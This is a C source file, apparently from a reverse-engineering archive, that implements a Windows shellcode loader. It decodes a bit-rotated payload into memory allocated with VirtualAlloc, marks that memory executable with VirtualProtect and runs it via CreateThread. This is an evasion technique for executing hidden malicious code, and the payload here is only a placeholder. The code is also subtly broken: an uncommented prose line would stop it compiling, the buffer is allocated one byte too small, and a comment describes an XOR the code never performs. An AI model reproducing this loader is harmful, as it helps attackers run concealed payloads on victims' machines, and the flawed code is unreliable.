/*
    Shellcode Loader
    Archive of Reversing.ID

    Custom encoding.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Bit Rotation
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>

// 8-bit rotation
#define rotl8(x,n)          ((x) << (n) | (x) >> ( 8 - (n)))
#define rotr8(x,n)          ((x) >> (n) | (x) << ( 8 - (n)))

// 16-bit rotation
#define rotl16(x,n)         ((x) << (n) | (x) >> (16 - (n)))
#define rotr16(x,n)         ((x) >> (n) | (x) << (16 - (n)))

#define make_word(L,R)      ((L) << 8 | (R))

/*
    dst: buffer which will receive the decoded shellcode
    src: buffer which store encoded shellcode
    size: the size of encoded buffer.

    decoding function should inverting the encoding function from generator.
*/
void transform (uint8_t * dst, uint8_t * src, size_t size)
{
    size_t   idx;
    uint8_t  L, R;
    uint16_t W;

    // inverse the ordering
    for (idx = 0; idx < size; idx += 2)
    {
        L = src[idx    ];
        R = src[idx + 1];

        // word-level rotation
        W = make_word(L, R);
        W = rotl16(W, 5);

        L = (W >> 8) & 0xFF;
        R = W & 0xFF;

        // XOR byte pair with key then rotate 
        dst[idx    ] = rotr8(L, 3);
        dst[idx + 1] = rotl8(R, 7);
    }
}

int main()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stackz
    uint8_t     payload []  = { 0x0c,0x21,0x3b,0x34 };
    uint32_t    payload_len = 4;

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len - 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    decode payload and store to allocated buffer
    transform ((uint8_t*)runtime, payload, payload_len);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}